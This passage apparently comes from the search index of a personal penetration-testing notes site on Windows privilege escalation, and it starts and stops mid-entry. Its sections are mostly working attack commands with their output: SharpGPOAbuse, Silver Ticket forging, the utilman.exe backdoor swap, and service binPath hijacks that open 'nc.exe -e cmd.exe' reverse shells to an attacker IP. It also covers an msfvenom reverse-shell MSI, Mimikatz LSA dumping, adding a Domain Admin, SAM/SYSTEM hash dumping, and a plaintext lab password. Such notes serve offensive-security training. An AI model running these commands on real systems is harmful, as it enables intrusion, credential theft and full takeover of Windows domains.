Controllers Policy\nDomainName       : vault.offsec\nOwner            : VAULT\\Domain Admins\nId               : 6ac1786c-016f-11d2-945f-00c04fb984f9\nGpoStatus        : AllSettingsEnabled\nDescription      :\nCreationTime     : 11/19/2021 12:50:33 AM\nModificationTime : 11/19/2021 1:50:32 AM\nUserVersion      : AD Version: 0, SysVol Version: 0\nComputerVersion  : AD Version: 1, SysVol Version: 1\nWmiFilter        :\n</code></pre>"},{"location":"pentest/privesc/windows/attack/gpo/#retrieve-specific-gpo","title":"Retrieve specific GPO","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\anirudh\\Documents&gt; Get-GPPermission -guid 31b2f340-016d-11d2-945f-00c04fb984f9 -targettype user -targetname anirudh\n\nTrustee     : anirudh\nTrusteeType : User\nPermission  : GpoEditDeleteModifySecurity\nInherited   : False\n</code></pre> <p>Remarks: User has <code>GpoEditDeleteModifySecurity</code></p>"},{"location":"pentest/privesc/windows/attack/gpo/#add-user-to-local-administrators-group","title":"Add User to Local Administrators Group","text":"<pre><code>.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount &lt;TARGET_USERNAME&gt; --GPOName \"&lt;GPO_NAME&gt;\"\n\n*Evil-WinRM* PS C:\\Users\\anirudh\\Documents&gt; .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName \"Default Domain Policy\"\n[+] Domain = vault.offsec\n[+] Domain Controller = DC.vault.offsec\n[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec\n[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103\n[+] GUID of \"Default Domain Policy\" is: {31B2F340-016D-11D2-945F-00C04FB984F9}\n[+] File exists: \\\\vault.offsec\\SysVol\\vault.offsec\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\n[+] The GPO does not specify any group memberships.\n[+] versionNumber attribute changed successfully\n[+] The version number in GPT.ini was increased successfully.\n[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!\n</code></pre>"},{"location":"pentest/privesc/windows/attack/gpo/#update-gp-settings","title":"Update GP settings","text":"<pre><code>gpupdate /force\n</code></pre> <p>Remarks: Relog to get <code>administrator</code> access Or <code>psexec</code></p>"},{"location":"pentest/privesc/windows/attack/silverticket/","title":"Silver Ticket","text":""},{"location":"pentest/privesc/windows/attack/silverticket/#what-is-a-silver-ticket","title":"What is a Silver Ticket?","text":"<p>Tickets used to forged Kerberos Ticket Granting Service (TGS) tickets that provide access to specific services on targeted servers. They are limited to the service they are designed for and do not grant domain-wide access.</p>"},{"location":"pentest/privesc/windows/attack/silverticket/#how-to","title":"How to ?","text":""},{"location":"pentest/privesc/windows/attack/silverticket/#pre-requisite","title":"Pre-requisite","text":"<ul> <li> <p>FQDN of target host: The fully qualified domain name of the server hosting the Kerberos service. Example: fileserver.domain.local</p> </li> <li> <p>Service Name: The Kerberos service type bound to the SPN in AD (e.g., cifs, http, mssql). Example: cifs</p> </li> <li> <p>NTLM Hash (RC4 key): NT hash of the account (service account, computer account, or user account) used for Kerberos encryption/decryption. Example: 8846f7eaee8fb117ad06bdd830b7586c</p> </li> </ul>"},{"location":"pentest/privesc/windows/attack/silverticket/#domain-sid","title":"Domain SID","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\Christopher.Lewis\\Documents&gt; (Get-ADdomain).DomainSID\n\nBinaryLength AccountDomainSid                          Value\n------------ ----------------                          -----\n24 S-1-5-21-1969309164-1513403977-1686805993 S-1-5-21-1969309164-1513403977-1686805993\n</code></pre>"},{"location":"pentest/privesc/windows/attack/silverticket/#target-spn","title":"TARGET SPN","text":"<pre><code>Get-ADUser -Filter {SamAccountName -eq \"svc_mssql\"} -Properties ServicePrincipalNames\nDistinguishedName     : CN=svc_mssql,CN=Users,DC=nagoya-industries,DC=com\nEnabled               : True\nGivenName             : svc_mssql\nName                  : svc_mssql\nObjectClass           : user\nObjectGUID            : df7dda21-173f-4a4a-88ed-70d69481b46e\nSamAccountName        : svc_mssql\nServicePrincipalNames : {MSSQL/nagoya.nagoya-industries.com}\nSID                   : S-1-5-21-1969309164-1513403977-1686805993-1136\nSurname               :\nUserPrincipalName     : svc_mssql@nagoya-industries.com\n\n(Get-ADUser -Filter {SamAccountName -eq \"svc_mssql\"} -Properties ServicePrincipalNames).ServicePrincipalNames\n\nMSSQL/nagoya.nagoya-industries.com\n</code></pre>"},{"location":"pentest/privesc/windows/attack/silverticket/#nthash","title":"NTHASH","text":"<p>Use ntlm-hash-generator</p>"},{"location":"pentest/privesc/windows/attack/silverticket/#kerberos-configuration","title":"Kerberos Configuration","text":"<p>Create <code>krb.conf</code> file</p> <pre><code>nxc smb 192.168.127.21 -u christopher.lewis -p P@ssword123 --generate-krb5-file nagoya_krb5\n</code></pre> <p>Edit <code>/etc/hosts</code> and save the files</p> <pre><code>export KRB5_CONFIG=./nagoya_krb5\n</code></pre>"},{"location":"pentest/privesc/windows/attack/silverticket/#silver-ticket","title":"SILVER TICKET","text":"<p>Get Ticket for target user </p> <pre><code>ftime impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -dc-ip 192.168.127.21 -spn MSSQL/nagoya.nagoya-industries.com svc_mssql\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for nagoya-industries.com/svc_mssql\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in svc_mssql.ccache\n</code></pre> <p>Export the ccache file</p> <pre><code>export KRB5CCNAME=./svc_mssql.ccache\n</code></pre> <p>Authenticate into the target service</p> <pre><code>ftime proxychains impacket-mssqlclient -k nagoya.nagoya-industries.com\n</code></pre>"},{"location":"pentest/privesc/windows/attack/silverticket/#password-authentication-vs-kerberoast-authentication","title":"Password Authentication vs Kerberoast Authentication","text":"Aspect Password Authentication Kerberoast (Silver Ticket) Method Direct NTLM/password login to service Forged Kerberos TGS for service SPN Auth Type NTLM/password-based Kerberos ticket-based Privilege Data May lack full AD group info Full PAC; can forge high privileges Trust Source Service verifies credentials Service trusts DC-signed ticket MSSQL Impact Limited to real user rights Can enable &amp; run <code>xp_cmdshell</code>"},{"location":"pentest/privesc/windows/attack/utilman/","title":"Utilman.exe","text":""},{"location":"pentest/privesc/windows/attack/utilman/#what-is-utilmanexe","title":"What is Utilman.exe?","text":"<p>The file that starts Ease of Access!</p>"},{"location":"pentest/privesc/windows/attack/utilman/#how-to","title":"How to?","text":"<p>Check privilege of <code>utilman.exe</code> and <code>cmd.exe</code></p> <pre><code>icacls C:\\Windows\\System32\\utilman.exe\nicacls C:\\Windows\\System32\\cmd.exe\n</code></pre>"},{"location":"pentest/privesc/windows/attack/utilman/#replace-utilmanexe-and-cmdexe","title":"Replace <code>utilman.exe</code> and <code>cmd.exe</code>","text":"<pre><code>mv C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman.bak\nmv C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe\n</code></pre>"},{"location":"pentest/privesc/windows/attack/utilman/#rdesktop-into-target","title":"Rdesktop into target","text":"<pre><code>rdesktop 192.168.209.172\n</code></pre>"},{"location":"pentest/privesc/windows/attack/utilman/#trigger","title":"Trigger","text":"<p>Press <code>Windows + U</code> will start a <code>terminal</code> without login</p>"},{"location":"pentest/privesc/windows/group/srvops/","title":"Srvops","text":""},{"location":"pentest/privesc/windows/group/srvops/#how-to","title":"How to ?","text":""},{"location":"pentest/privesc/windows/group/srvops/#get-services-list","title":"Get services list","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\anirudh\\Documents&gt; services\n\nPath                                                                           Privileges Service          \n----                                                                           ---------- -------          \nC:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe                            True ADWS             \nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exe                        True NetTcpPortSharing\nC:\\Windows\\SysWow64\\perfhost.exe                                                     True PerfHost         \n\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe\"           True Sense            \nC:\\Windows\\servicing\\TrustedInstaller.exe                                            True TrustedInstaller \n\"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\"               True VGAuthService    \nC:\\Users\\anirudh\\Documents\\nc.exe -e cmd.exe 192.168.45.246 8000                     True VMTools          \n\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2111.5-0\\NisSrv.exe\"        True WdNisSvc         \n\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2111.5-0\\MsMpEng.exe\"       True WinDefend        \n\"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\"                                 True WMPNetworkSvc\n</code></pre>"},{"location":"pentest/privesc/windows/group/srvops/#edit-the-binary-path","title":"Edit the binary path","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\anirudh\\Documents&gt; sc.exe config VMTools binPath=\"C:\\Users\\anirudh\\Documents\\nc.exe -e cmd.exe 192.168.45.246 8000\"\n[SC] ChangeServiceConfig SUCCESS\n\nOR\n\nsc.exe config VMTools binPath=\"C:\\Users\\aarti\\Documents\\shell.exe\"\n</code></pre>"},{"location":"pentest/privesc/windows/group/srvops/#stop-and-start-service","title":"Stop and start service","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\anirudh\\Documents&gt; sc.exe stop VMTools\nSERVICE_NAME: VMTools\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 1  STOPPED\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n*Evil-WinRM* PS C:\\Users\\anirudh\\Documents&gt; sc.exe start VMTools\n</code></pre>"},{"location":"pentest/privesc/windows/group/srvops/#system","title":"SYSTEM","text":"<pre><code>rlwrap nc -lvnp 8000\nlistening on [any] 8000 ...\nconnect to [192.168.45.246] from (UNKNOWN) [192.168.209.172] 50921\nMicrosoft Windows [Version 10.0.17763.2300]\n(c) 2018 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32&gt;whoami\nwhoami\nnt authority\\system\n</code></pre>"},{"location":"pentest/privesc/windows/kernel/exp/","title":"Exploitation","text":"<p>Check SYSTEM information</p> <pre><code>systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Processor(s)\" /C:\"System Locale\" /C:\"Input Locale\" /C:\"Domain\" /C:\"Hotfix(s)\"\n</code></pre> <p>Check hotfixes</p> <pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn\n</code></pre> <p>Check with Windows Exploit Suggester - New Generation</p> <pre><code>python wes.py &lt;SYSTEM_INFO&gt;\n</code></pre> <ul> <li>Refer to https://github.com/SecWiki/windows-kernel-exploits</li> <li>Search for POC </li> </ul>"},{"location":"pentest/privesc/windows/kernel/kernel/","title":"What is a Kernel?","text":"<p>The Kernel is the core component of an operating system that acts as a bridge between the applications and the physical hardware of a computer.</p> Functionality Description Process Management Manages the scheduling, creation, execution, and termination of processes. Coordinates CPU time allocation and inter-process communication. Memory Management Allocates and deallocates memory for processes. Manages virtual memory to provide an extended amount of memory beyond physical limits. File System Management Handles file operations like creation, deletion, reading, writing, and directory management. Manages file access control and permissions. Device Management Interfaces with hardware devices through drivers. Manages and controls input and output operations for devices such as printers and disk drives. System Calls Provides an API for applications to request services from the kernel, such as file operations, process creation, and hardware interactions. Interrupt Handling Responds to interrupts from hardware devices, ensuring the system can quickly react to events like user input or network packets."},{"location":"pentest/privesc/windows/kernel/types/","title":"Types of Kernel","text":"Kernel Type Description Examples Monolithic Contains all essential services within a single code block, including file management, process management, and device drivers. Linux kernel Microkernel Includes only basic functionalities in the kernel; other services run in user space, enhancing modularity and stability. Minix Hybrid Combines features of both monolithic and microkernels, aiming for a balance between performance and modularity. Windows NT kernel Exokernel Provides minimal abstractions for hardware, allowing applications to manage hardware resources directly for specialized performance. Exokernel OS"},{"location":"pentest/privesc/windows/registry/alwaysinstallelevated/","title":"AlwaysInstallElevated","text":""},{"location":"pentest/privesc/windows/registry/alwaysinstallelevated/#what-is-alwaysinstallelevated","title":"What is AlwaysInstallElevated?","text":"<p>AlwaysInstallElevated is a Windows Installer policy that, when set in both HKCU and HKLM to 0x1, allows .msi packages to be installed with SYSTEM privileges even by low-privileged users.</p>"},{"location":"pentest/privesc/windows/registry/alwaysinstallelevated/#how-to","title":"How to ?","text":"<p>Query for AlwaysInstallElevated registry key</p> <pre><code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  \nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre> <p>Note: Both the current user and local machine hives must be 0x1 (Turned on)</p> <p>Generate reverse shell for <code>.msi</code></p> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;TARGET_IP&gt; LPORT=&lt;PORT&gt; -f msi -o rev.msi\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.38.79 LPORT=53 -f msi -o rev.msi\n</code></pre> <p>Upload file and run the installer using msiexec</p> <pre><code>msiexec /quiet /qn /i &lt;PATH_TO_.msi&gt;\nmsiexec /quiet /qn /i C:\\Users\\dev-datasci-lowpriv\\Downloads\\rev.msi\n</code></pre> <p><code>msiexec</code>: Windows Installer Command-line utility used for installing, modifying, or uninstalling MSI packages <code>/quiet</code>: Runs the installer with no user interface or prompts displayed <code>/qn</code>: Quiet mode with no user interface <code>/i</code>: install the specified package  </p> <p>Case 1: - <code>msiexec</code> not installing (No response) - Available User credentials Try <code>runasc</code></p> <pre><code>PS C:\\Users\\dev-datasci-lowpriv\\Downloads&gt; invoke-runascs 'dev-datasci-lowpriv' 'wUqnKWqzha*W!PWrPRWi!M8faUn' \"cmd /c msiexec /quiet /qn /i C:\\Users\\dev-datasci-lowpriv\\Downloads\\rev.msi\"  \n</code></pre>"},{"location":"pentest/privesc/windows/registry/alwaysinstallelevated/#mitigation","title":"Mitigation","text":"<ul> <li>Disable Computer Configuration\\Administrative Templates\\Windows Components\\Windows Installer</li> <li>Disable User Configuration\\Administrative Templates\\Windows Components\\Windows Installer</li> </ul>"},{"location":"pentest/privesc/windows/registry/autorun/","title":"AutoRun","text":""},{"location":"pentest/privesc/windows/registry/autorun/#what-is-autorun-registry","title":"What is AutoRun (Registry)?","text":"<p>AutoRun (Registry) is a Windows feature that automatically launches specified programs during system startup or user login.</p>"},{"location":"pentest/privesc/windows/registry/autorun/#how-to","title":"How to ?","text":"<p>Query the registry for AutoRun executables</p> <pre><code>reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n</code></pre> <p>Check privilege of the AutoRun executable (<code>program.exe</code>)</p> <pre><code>accesschk.exe /accepteula -wvu \"C:\\Program Files\\Autorun Program\\program.exe\"\nicacls &lt;FILE&gt;\n</code></pre> <p>Overwrite the file with malicious executable and reboot</p> <pre><code>shutdown /r /t 0\n</code></pre>"},{"location":"pentest/privesc/windows/registry/storedcred/","title":"StoredCredentials","text":"<p>List registries that have keys or values that contain the word <code>password</code></p> <pre><code>reg query HKCU /f password /t REG_SZ /s\nreg query HKLM /f password /t REG_SZ /s\n\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\"\n\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"\n\nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"\n\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"\n</code></pre> <ul> <li>reg query: Command to query the Windows Registry  </li> <li>HKLM: Specifies the <code>HKEY_LOCAL_MACHINE</code> hive, which contains settings for the local machine  </li> <li>/f password: Searches for the term \"password\"  </li> <li>/t REG_SZ: Filters results to only show <code>REG_SZ</code> type values (string values)</li> </ul>"},{"location":"pentest/privesc/windows/tokenprivileges/intro/","title":"Introduction","text":"<p>Access tokens are security objects in Windows that represent the identity and permissions of a user or process. They are crucial for authentication and authorization. They are created by the Local Security Authority (LSA) when a user login to a system whether it is locally, over the network, as a service, or even directly calling an API function. </p>"},{"location":"pentest/privesc/windows/tokenprivileges/intro/#how-it-works","title":"How It Works?","text":"<ul> <li>Creation: Tokens are generated when a user logs in or a process starts.  It contains ID of the logon session, User and group SIDs, integrity level and privileges held by the user or groups the user is in.  </li> <li>Use: Tokens are used to authenticate and authorize access to resources. A process can use an impersonation token to act on behalf of another user.  </li> <li>Impersonation: A process can temporarily adopt the security context of another user, allowing it to perform actions with the impersonated user's privileges.</li> </ul> <p>Types of Tokens - Primary Token: Represents the security context of a process. - Impersonation Token: Allows a process to assume the identity and privileges of another user or process. - Delegation Token: Used in scenarios where a service needs to perform actions on behalf of a user, often involving Kerberos delegation.</p> <p>To check privileges</p> <pre><code>whoami /priv\n</code></pre> <p>Invokes <code>mimikatz</code> through <code>powershell</code> to dump LSA secrets</p> <pre><code>Invoke-Mimikatz -Command '\"privilege::debug\" \"LSADump::LSA /patch\" exit' -Computer HYDRA.marvel.local\n</code></pre> <p>[[Gaining Shell Access]] with metasploit ![[Gaining Shell Access#^6e325c]] Load incognito</p> <pre><code>1. load incognito\n2. list_tokens -u\n3. impersonate_token &lt;DOMAIN&gt;\\\\&lt;USERNAME&gt;\n\n</code></pre> <p>Add new user as Domain Admin</p> <pre><code>1. net user /add &lt;USERNAME&gt; &lt;PASSWORD&gt;@ /domain\n2. net group \"Domain admins\" &lt;USERNAME&gt; /ADD /DOMAIN\n\n</code></pre>"},{"location":"pentest/privesc/windows/tokenprivileges/intro/#mitigation","title":"Mitigation","text":"Methods Description Secure Token Storage Protect tokens from unauthorized access and ensure secure handling and storage of tokens. Least Privilege Apply the principle of least privilege to limit the permissions of user accounts and processes to reduce the impact of potential impersonation. Access Control Policies Enforce strict access control policies and regularly review user and process permissions. Limit User/Group Token Creation Restrict who can create or manage tokens to trusted administrators or processes. Account Tiering Separate accounts into different security tiers to limit damage from compromised lower-tier accounts. Local Admin Restriction Restrict local administrative privileges to reduce the risk of token manipulation and unauthorized actions."},{"location":"pentest/privesc/windows/tokenprivileges/intro/#terminologies","title":"Terminologies","text":"<ul> <li>Component Object Model (COM): A system that creates binary software components that can interact</li> <li>DCOM (Distributed Component Object Model) allows software components to communicate over networked computers.</li> <li><code>OXID</code> Resolver: A service (Part of <code>RPCSS</code> service) that runs on every machine and supports COM. It allows a client to resolve a COM server object and bind to it for methods invocations. (Typically authenticated using NTLM) Note: Starting from Windows 10 1809 &amp; Windows Server 2019, its\u00a0no more possible\u00a0to query the OXID resolver on a port different than 135</li> <li>IMarshal interface: Enables a COM object to define and manage the marshaling of its interface pointers.</li> <li>Marshaling: The process of packaging data into packets for transmission to a different process or computer</li> <li>Unmarshaling: The process of recovering that data at the receiving end.</li> <li><code>CLSID</code>: a unique global identifier that identifies a COM class object, like Universally unique identifier (UUID).</li> <li>Background Intelligent Transfer Service (BITS): A Microsoft service that facilitates asynchronous, prioritized and throttled file transfers (Downloading files in the background).</li> <li>WinRM is a management protocol used by Windows to handle remote management and automation tasks. It is built on the HTTP protocol, and typically administrators use it to manage systems remotely, for instance, via PowerShell remoting.</li> </ul> <p>Pipes are a method of Inter-Process Communication (IPC) on Windows, enabling processes to share data. A pipe acts as a shared channel where one process (the pipe server) writes data and another (the pipe client) reads it. Pipes can be either anonymous or named. - Anonymous pipes are used for communication between a parent and child process, typically for redirecting input or output. These pipes are simple but can\u2019t be used between unrelated processes. - Named pipes, on the other hand, allow communication between unrelated processes, even across networks, as long as the client has appropriate access permissions. They are a versatile way for independent processes to exchange data.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/sebackup/","title":"Sebackup","text":""},{"location":"pentest/privesc/windows/tokenprivileges/sebackup/#what","title":"What ?","text":"<p>Allows a user to bypass ACL checks and read any file on the system, regardless of its permissions. This is mainly used by backup tools to retrieve file contents without normal access restrictions.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/sebackup/#how-to","title":"How to ?","text":"<p>Check privilege of user</p> <pre><code>whoami /priv\n</code></pre> <p>Copy SAM and SYSTEM files</p> <pre><code>reg save hklm\\sam C:\\Users\\enterpriseuser\\sam.bak\nreg save hklm\\system C:\\Users\\enterpriseuser\\system.bak\n</code></pre> <p>Download file and hashdump</p> <pre><code>secretsdump.py -sam sam.bak -system system.bak LOCAL \n</code></pre>"},{"location":"pentest/privesc/windows/tokenprivileges/semanagevolume/","title":"semanagevolume","text":""},{"location":"pentest/privesc/windows/tokenprivileges/semanagevolume/#what","title":"What ?","text":"<p>Allows volume-level management operations like locking volumes, defragmentation, volume dismount, or setting valid data length. It is enforced by the file system driver using FSCTL operations and is mainly used by disk management tools.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/semanagevolume/#how-to","title":"How to ?","text":"<p>Check privilege</p> <pre><code>whoami /priv\n</code></pre>"},{"location":"pentest/privesc/windows/tokenprivileges/semanagevolume/#_1","title":"semanagevolume","text":"<p>Download this exploit for SeManageVolume Privilege</p> <p>Run exploit</p> <pre><code>\\SeManageVolumeExploit.exe \n</code></pre> <p>Check permissions after running exploit</p> <pre><code>C:\\xampp\\htdocs\\uploads&gt;icacls C:/Windows\nC:/Windows NT SERVICE\\TrustedInstaller:(F)\n           NT SERVICE\\TrustedInstaller:(CI)(IO)(F)\n           NT AUTHORITY\\SYSTEM:(M)\n           NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(F)\n           BUILTIN\\Users:(M)\n           BUILTIN\\Users:(OI)(CI)(IO)(F)\n</code></pre> <p>Remarks: User has full permissions on the Windows Folder</p>"},{"location":"pentest/privesc/windows/tokenprivileges/semanagevolume/#_2","title":"semanagevolume","text":""},{"location":"pentest/privesc/windows/tokenprivileges/semanagevolume/#_3","title":"semanagevolume","text":""},{"location":"pentest/privesc/windows/tokenprivileges/serestore/","title":"serestore","text":""},{"location":"pentest/privesc/windows/tokenprivileges/serestore/#what","title":"What ?","text":"<p>Allows a user to write or modify file contents even if the ACL denies access. It also allows changing the file owner and its protection settings. Typically used by restore operations to place files back into their original locations.</p> <p><code>SeRestorePrivilege</code>: - Bypass ACL checks \u2014 just like the system would during a file restore - Enable Modification of readonly/protected files - Enable setting or changing file owners and permission  </p>"},{"location":"pentest/privesc/windows/tokenprivileges/serestore/#how-to","title":"How to ?","text":""},{"location":"pentest/privesc/windows/tokenprivileges/serestore/#serestoreabuse","title":"SeRestoreAbuse","text":"<p>Check privilege</p> <pre><code>whoami /priv\n</code></pre> <p>Download the compiled executable -&gt; here</p> <p>Run executable</p> <pre><code>.\\SeRestoreAbuse.exe \"cmd /c C:\\Users\\anirudh\\Documents\\nc.exe -e cmd.exe 192.168.45.246 3000\"\n.\\SeRestoreAbuse.exe \"C:\\Users\\svc_apache$\\Documents\\rev.exe\"\n</code></pre> <p>Remarks: Retrieve SYSTEM access</p>"},{"location":"pentest/privesc/windows/tokenprivileges/serestore/#utilmanexe-and-cmdexe","title":"<code>utilman.exe</code> and <code>cmd.exe</code>","text":"<p>Swap the executables</p> <pre><code>mv C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman.bak\nmv C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe\n</code></pre> <p>Connect to TARGET</p> <pre><code>rdesktop &lt;TARGET&gt;\n</code></pre> <p>To launch a SYSTEM cmd: Press win + U</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/hot/","title":"HotPotato","text":"<p>The first potato discovered by Stephen Breen.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/hot/#how-does-it-work","title":"How does it work?","text":"<p>WPAD Setup: The attacker sets up a rogue WPAD (Web Proxy Auto-Discovery) server that receives the victim's HTTP traffic. The attacker captures NTLM authentication requests directed at the WPAD server. 1. NBNS spoofing: The attacker sends spoofed NBNS responses, tricking the victim into resolving network names through the attacker's machine instead of legitimate DNS servers. 2. Forced DNS Failure: If the victim's DNS queries fail (e.g., due to port exhaustion or other issues), they may fall back to NBNS for name resolution, allowing the attacker to respond with false information. 3. NTLM Relay: The attacker relays the captured NTLM hashes to local services (such as SMB or HTTP), which can lead to privilege escalation by executing commands with elevated privileges.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/juicy/","title":"JuicyPotato","text":""},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/juicy/#background-information","title":"Background information","text":"<p>Juicy Potato is a variant of the RottenPotatoNG exploit that was developed to bypass situations where the BITS service is disabled or port 6666 is in use, preventing the original RottenPotato attack from working. It still targets privilege escalation on Windows systems, but instead of relying solely on BITS, it leverages other COM servers that can be exploited to escalate privileges.</p> <p>Requirements for the exploit to work: 1. Instantiable COM server by the current user (typically a \"service user\" with impersonation privileges). 2. The server must implement the IMarshal interface. 3. The server runs as an elevated user (e.g., SYSTEM or Administrator).</p> <p>JuicyPotato allows you to: - Target CLSID: Pick any CLSID you want, with a list organized by OS. - COM Listening Port: Define the COM listening port instead of the default 6666. - COM Listening IP Address: Bind the server to any IP address. - Process Creation Mode:  </p> <pre><code>- CreateProcessWithToken (requires SeImpersonate privilege)  \n- CreateProcessAsUser (requires SeAssignPrimaryToken privilege)  \n- Both options are available.\n</code></pre> <ul> <li>Process to Launch: Specify an executable or script to launch if exploitation succeeds.</li> <li>Process Argument: Customize the arguments for the launched process.</li> <li>RPC Server Address: Authenticate to an external RPC server for stealth.</li> <li>RPC Server Port: Use a different port if port 135 is blocked by a firewall.</li> <li>Test Mode: Test CLSIDs by creating the DCOM object and printing the user token for verification.</li> </ul>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/juicy/#how-it-works","title":"How it works?","text":"<p>The core concept is similar to that of the RottenPotato exploit but extends it by targeting additional COM services and allowing more flexible configuration options.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/juicy/#how-to","title":"How to ?","text":"<p>Upload a <code>.bat</code> file (Reverse shell code) on Windows Target</p> <p>Run Juicy potato executable</p> <pre><code>.\\JuicyPotato.exe -t * -p &lt;.bat FILE&gt; \n</code></pre>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/local/","title":"LocalPotato","text":""},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/local/#ntlm-authentication","title":"NTLM Authentication","text":""},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/local/#remote-ntlm-authentication","title":"Remote NTLM Authentication","text":"<ul> <li>Used when a user attempts to authenticate to a remote server How it works?  </li> <li>Type 1 Message:\u00a0The client sends a packet to negotiate the terms of the authentication process. The packet optionally contains the name of the client machine and its domain. The server receives the packet and can check that authentication was started from a different machine.  </li> <li>Type 2 Message:\u00a0The server responds to the client with a challenge. The \"challenge\" is a random number used to authenticate the client without having to pass their credentials through the network.  </li> <li>Type 3 Message:\u00a0The client uses the challenge received on the Type 2 message and combines it with the user's password hash to generate a response to the challenge. The response is sent to the server as part of the Type 3 message. That way, the server can check if the client knows the correct user's password hash without transferring it through the network.  </li> </ul>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/local/#local-ntlm-authentication","title":"Local NTLM Authentication","text":"<ul> <li>Used when a user tries to log into a service running on the same machine relying on a Security Context (A set of security parameters associated with a connection, including the session key and the user whose privileges).  </li> <li>Type 1 Message:\u00a0The client sends this message to start the connection. It is used to negotiate authentication parameters just like before but also contains the name of the client machine and its domain. The server can check the client's name and domain, and the local authentication process begins if they match their own.  </li> <li>Type 2 Message:\u00a0The server creates a Security Context and sends back its ID to the client in this message. The client can then use the Security Context ID to associate itself with the connection.  </li> <li>Type 3 Message:\u00a0If the client successfully associates themselves with an existing Security Context ID, an empty Type 3 message is sent back to the server to signal that the local authentication process succeeded.</li> </ul>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/local/#how-local-potato-works","title":"How Local Potato works?","text":"<p>Local Potato takes advantage of a flaw in a special case of NTLM authentication called NTLM local authentication to trick a privileged process into authenticating a session that the attacker initiates against the local SMB server.</p> <ol> <li>Attacker will trigger a privileged process 1 to connect to a rogue server.</li> <li>The rogue server will instantiate a Security Context A for privileged process 1 but won't send it back immediately.</li> <li>Attacker will launch a rogue client that simultaneously initiates a connection against the local SMB server with its unprivileged credentials.</li> <li>The rogue client will send NTLM Type 1 message to initiate NTLM authentication and the server will reply with a Type 2 message with the ID for a Security Context B.</li> <li>Attacker can swap the two Context IDs from both connections such that privileged process 1 will associate its user with Security Context B. </li> <li>Attacker's client can now access any network share with SYSTEM privilege</li> </ol>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/printspoofer/","title":"PrintSpoofer","text":"<p>It primarily targets the way named pipes and RPC (Remote Procedure Call) notifications are handled by the Print Spooler, specifically leveraging the Printer Bug exploit.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/printspoofer/#how-it-works","title":"How it works?","text":"<p>The concept behind PrintSpoofer is leveraging the Printer Bug exploit, which abuses the Windows Print Spooler service\u2019s <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code> function. This function sends change notifications via RPC over Named Pipes to a specific named pipe, typically <code>\\\\HOSTNAME\\pipe\\spoolss</code>, which is owned and controlled by the SYSTEM account. Since creating or controlling this specific pipe directly isn't feasible due to its ownership, a clever manipulation of the path can bypass this restriction.</p> <p>Core steps 